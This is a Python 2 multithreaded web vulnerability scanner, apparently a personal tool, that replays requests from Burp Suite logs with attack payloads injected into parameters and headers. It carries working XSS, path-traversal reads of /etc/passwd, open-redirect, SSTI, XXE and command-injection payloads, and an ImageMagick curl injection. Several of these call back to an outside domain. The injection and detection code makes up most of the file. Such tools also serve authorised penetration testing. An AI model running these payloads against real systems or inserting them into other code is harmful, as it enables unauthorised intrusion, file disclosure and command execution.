#!/usr/bin/env python
#coding=utf-8

import threading
import random
import requests
import copy
import urlparse
import urllib
import re
import json
import base64
import copy
import time
import sys
import argparse
from AutoSqli import AutoSqli
import logging
from Queue import Queue
from colorama import *
from classSQL import *
from lib.common import *

"""
根据网络上的一些脚本，自己改了一下
现在是多线程，对于burpsuite的日志提取出GET方法来，
过滤出一些`txt`, `jpg`等图片，js，css，无关的请求
然后使用 host+path+sorted(请求参数名) 这一个字符串作为去重的条件
得到的结果分别将xss的payload插入到对应的位置上去
再去请求
v1版本，不保证稳定性，只操作GET型的XSS， payload可以自己添加
"""

requests.packages.urllib3.disable_warnings()

_random=str(random.randint(300,182222))
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s ^^^: %(message)s')
logging.getLogger("requests").setLevel(logging.WARNING)
lock = threading.Lock()
# XSS规则
XSS_Rule = {
    "xss":[
        "\" onfous=alert(document.domain)\"><\"",
        "\"`'></textarea><audio/onloadstart=confirm`1` src>",
        "\"</script><svg onload=alert`1`>",
        # "\"`'></textarea><audio/onloadstart=confirm`1` src>",
    ],
    "lfi": [
        "../../../../../../../../../../etc/passwd",
        "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "../../../../../../../../../../etc/passwd%00",
    ],
    # URL跳转与SSRF
    "redirect" : [
        'http://www.niufuren.cc/usr.txt', #  Valar Morghulis
        '@www.niufuren.cc/usr.txt', #  Valar Morghulis
    ],

    "cli" : [
        "$(nslookup {domain}.devil.yoyostay.top)",
        '&nslookup {domain}.devil.yoyostay.top&\'\\"`0&nslookup {domain}.devil.yoyostay.top&`\'',
        "nslookup {domain}.devil.yoyostay.top|nslookup {domain}.devil.yoyostay.top&nslookup {domain}.devil.yoyostay.top",
        # "'nslookup {domain}|nslookup {domain}&nslookup {domain}'",
        # '"nslookup {domain}|nslookup {domain}&nslookup {domain}"',
        ";nslookup {domain}.devil.yoyostay.top|nslookup {domain}.devil.yoyostay.top&nslookup {domain}.devil.yoyostay.top;"
    ],
    'ssti' : [
        '{{1357924680 * 2468013579}}',
        '${1357924680 * 2468013579}'
    ],
    'xxe' : [
        '<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://soapxxe_{domain}.devil.yoyostay.top/"> %dtd;]><xxx/>]]></foo></soap:Body>',
        '<?xml version="1.0" encoding="utf-8"?>\n\n<!DOCTYPE r [\n\n<!ENTITY r ANY>\n\n<!ENTITY sp SYSTEM "http://xxe_{domain}.devil.yoyostay.top/">\n\n]>\n\n<r>&sp;</r>'
    ]
}


XXE_Role = '<?xml version="1.0" encoding="utf-8"?>\n\n<!DOCTYPE r [\n\n<!ENTITY r ANY>\n\n<!ENTITY sp SYSTEM "http://xxe_{domain}.devil.yoyostay.top/">\n\n]>\n\n<r>&sp;</r>'

# imageMagick rules
ImageMagick_Rule = 'push graphic-context\nviewbox 0 0 640 480\nimage copy 200,200 100,100 "|curl http://imagemagick_{domain}.devil.yoyostay.top"\npop graphic-context'


# 文件包含规则


def getLinks(filename):
    # 得到url, headers->{"cookie", "Referer", "User-Agent"}
    result = {}
    no_repeat = set()
    DEBUG = True
    with open(filename, 'rb') as f:
        content=f.read()
        blocks = re.split("======================================================[\n|\r\n]", content)
        for index, block in enumerate(blocks):

            block = re.split("[\n|\r\n]", block)

            # continue
            tmp = [i for i in block if i]
            if (len(tmp) < 4): continue
            if (not tmp[0].startswith('GET')) and (not tmp[0].startswith('POST')): continue
            try:
                p = tmp[0].split(" ")[1]
                if not checkType(p):
                    continue
            except:
                continue

            path = ""
            host = ""
            headers = {"Cookie": "", "User-Agent": ""}
            method = ''

            for _ in tmp:
                if _.startswith("GET") or _.startswith("POST"):
                    # 以防格式不对，多出来一个请求头
                    method = _[:4].strip()
                    if path == "":
                        path = _.split(" ")[1]
                    else:
                        break
                if _.startswith("Host"):
                    #print _.split(":")[1]
                    host = _.split(":")[1].strip()
                if _.startswith("User-Agent"):
                    headers["User-Agent"] = _.split(":")[1].strip()
                if _.startswith("Referer"):
                    headers["Referer"] = "".join(_.split(":")[1:]).strip()
                if _.startswith("Cookie"):
                    headers["Cookie"] = _.split(":")[1].strip()
                if _.startswith("Content-Type"):
                    headers['Content-Type'] = _.split(':')[1].strip()
                if _.startswith("Accept-Language"):
                    headers['Accept-Language'] = _.split(":")[1].strip()

            # 去重，利用域名，目录， 和参数的sort值来判断，如果相同就忽略
            # 否则就加入到no_repeat里
            url = "http://" + host + path
            if not checkRepeat(url, method, no_repeat):
                result[index] = {}
                result[index]["url"] = url
                result[index]["headers"] = headers
                if tmp[0].startswith("POST"):
                    result[index]["data"] = tmp[-1]
            else:
                continue
        print "The length: {0}".format(len(result))
        return result

def checkType(path):
    if path.split("?")[0].split(".")[-1] in (("f4v","bmp","bz2","css","doc","eot","flv","gif","gz","ico","jpeg","jpg","js","less","mp3", "mp4", "pdf","png","rar","rtf","swf","tar","tgz","txt","wav","woff","xml","zip")):
        return False
    else:
        return True

def checkRepeat(host, method, no_repeat=None):
    try:
        url_node = urlparse.urlparse(host)
        query_dict = urlparse.parse_qs(url_node.query)
        param = "".join(sorted(query_dict.keys()))
        host = url_node.netloc
        path = url_node.path
        # host + path + param 来判断是否存在
        tmp = method + host + path + param
        if tmp in no_repeat:
            return True
        else:
            no_repeat.add(tmp)
            return False
    except Exception as e:
        return True


def start_point(args):
    dict_links = getLinks(args.file)
    HTTPQUEUE = Queue()
    for index in dict_links:
        url = dict_links[index]['url']
        headers = dict_links[index]['headers']
        ContentType = headers.get('Content-Type', '')
        if 'multipart/form-data' in ContentType:
            continue
        if 'text/plain' in ContentType:
            continue
        data = dict_links[index]['data'] if 'data' in dict_links[index] else None
        if data:
            method = 'POST'
        else:
            method = 'GET'
        HTTPQUEUE.put(THTTPJOB(url, method=method, data=data, headers=headers))

    outqueue = Queue()
    logging.info("[-] Totally {0} requests".format(HTTPQUEUE.qsize()))
    time.sleep(3)
    threads = []
    # 30个线程来跑
    for i in xrange(args.threads):
        thd = detectXSS(HTTPQUEUE, outqueue, args.delay)
        #thd.setDaemon(True)
        threads.append(thd)

    for thd in threads:
        thd.start()

    for thd in threads:
        if thd.is_alive():
            thd.join()

    while not outqueue.empty():
        a = outqueue.get()
        print "[++++++]" + Fore.GREEN + "[{}]\n        ".format(a[0]) + Fore.YELLOW + "[{}]\n        ".format(a[1]) + Fore.RED + a[2] + Style.RESET_ALL





class detectXSS(threading.Thread):
    """docstring for detectXSS"""
    def __init__(self, inqueue, outqueue, delay):
        threading.Thread.__init__(self)
        self.inqueue =  inqueue
        self.outqueue = outqueue
        self.delay = delay

    def run(self):
        while True:
            if self.inqueue.empty():
                break
            hj = self.inqueue.get()
            isjson = False
            if hj.method == 'GET':
                query = hj.url.get_query
            else:
                if hj.headers.get('Content-Type', '').find('json') >= 0:
                    # print "with json, data is {}".format(hj.data)
                    query = urllib.urlencode(json.loads(hj.data))
                    isjson=True
                else:
                    query = hj.data
            # domain to replace
            domain = base64.b64encode(hj.url.url_string()).replace('=', '')
            for p in XSS_Rule:
                if p in ['cli', 'xxe']:
                    copy_rules = copy.copy(XSS_Rule[p])   # copy a rules to replace the {domain}
                    copy_rules = [pp.replace('{domain}', domain) for pp in copy_rules]
                else:
                    copy_rules = XSS_Rule[p]
                    # print "no cli,xxe rulse  {}".format(copy_rules)
                    # p.replace('{domain}', domain)
                if p == 'xxe':
                    # if payload type is xxe, we only need to chage the Content-Type to application/xml
                    # and method to POST
                    # then request
                    ContentType_status = hj.headers.get('Content-Type', '')
                    hj.headers['Content-Type'] = 'application/xml'
                    method_status = hj.method
                    hj.method = 'POST'
                    for rule in copy_rules:
                        hj.data = rule
                        hj.request()
                    hj.method = method_status
                    hj.headers['Content-Type'] = ContentType_status
                else:
                        # hj.data = XSS_Rule[p]
                    # print copy_rules
                    poll = Pollution(query, copy_rules, isjson=isjson).payload_generate()
                    # print poll
                    # poll is dict list
                    found = False
                    for payload in poll:
                        if found:
                            break
                        if hj.method == 'GET':
                            hj.url.get_dict_query = payload
                        else:
                            if isjson:
                                hj.data = json.dumps(payload)
                            else:
                                hj.data = urllib.urlencode(payload)
                        print hj
                        time.sleep(self.delay)
                        status_code, headers, content, t = hj.request()
                        if p == 'xss':
                            for regex in XSS_Rule[p]:
                                # print hj.headers.get('Cookie')
                                # print status_code, headers.get('Content-Type', '')
                                if regex in content and status_code == 200 and headers.get('Content-Type', '')  not in  ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]:
                                    # print "-------------------------------------"
                                    self.outqueue.put(('XSS', payload, hj.response.request.url))
                                    found = True
                                    break
                        if p == 'lfi':
                            if "root:x:0" in content and status_code == 200:
                                self.outqueue.put(('LFI', payload, hj.response.request.url))
                                found = True
                                break
                        if p == 'redirect':
                            if 'Valar Morghulis' in content and status_code == 200:
                                self.outqueue.put(('Unsafe Redirect', payload, hj.response.request.url))
                                found = True
                                break

                        if p == 'ssti':
                            if '3351376549499229720' in content and status_code == 200:
                                self.outqueue.put(('SSTI', payload, hj.response.request.url))
                                found = True
                                break


            # FUZZ THE HTTP HEADERS
            hj.headers['Client-IP'] = '127.0.0.1'
            hj.headers['X-Forwarded-For'] = '127.0.0.1'
            hj.headers['Referer'] = 'http://www.baidu.com' if 'Referer' not in hj.headers else hj.headers['Referer']
            real_headers = hj.headers.copy()
            cli_payloads = copy.copy(XSS_Rule['cli'])
            cli_payloads = [p.replace('{domain}', domain) for p in cli_payloads]
            for payload in cli_payloads:
                hj.headers['User-Agent'] = real_headers['User-Agent'] + payload
                hj.headers['Client-IP'] = real_headers['Client-IP'] + payload
                hj.headers['X-Forwarded-For'] = real_headers['X-Forwarded-For'] + payload
                hj.headers['Referer'] = real_headers['Referer'] + payload
                hj.request()
            









def parse_arg():
    parser =  argparse.ArgumentParser()
    parser.add_argument("-t", "--threads", type=int, default=100, help="the threads num, default is 100")
    parser.add_argument("-d", "--delay", type=int, default=0, help="the delay of each request, default is 0")
    parser.add_argument("file",  help="the burpsuite log file")
    args = parser.parse_args()
    return args




if __name__ == '__main__':
    Usage = "python %s target_log" %(sys.argv[0])

    try:
        args = parse_arg()
    except:
        print Usage
        exit(0)
    start_point(args)



